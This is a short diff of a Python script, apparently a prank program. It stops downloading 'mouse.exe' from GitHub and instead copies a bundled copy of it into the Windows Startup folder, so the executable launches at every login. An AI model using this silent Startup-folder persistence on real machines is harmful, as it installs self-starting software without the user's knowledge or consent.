@@ -17,12 +17,13 @@ def play_audio(path):
 
 def mouse_setup():
     # %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-    r = requests.get("https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/mouse.exe", stream=True)
+    # r = requests.get("https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/mouse.exe", stream=True)
+    #
+    # with open('dist/mouse.exe', 'wb') as out_file:
+    #     out_file.write(r.content)
 
-    with open('dist/mouse.exe', 'wb') as out_file:
-        out_file.write(r.content)
-
-    shutil.copy("dist/mouse.exe",os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
+    mouse_path = get_asset_path("assets/mouse.exe")
+    shutil.copy(mouse_path,os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
 
 def main():
     mouse_setup()
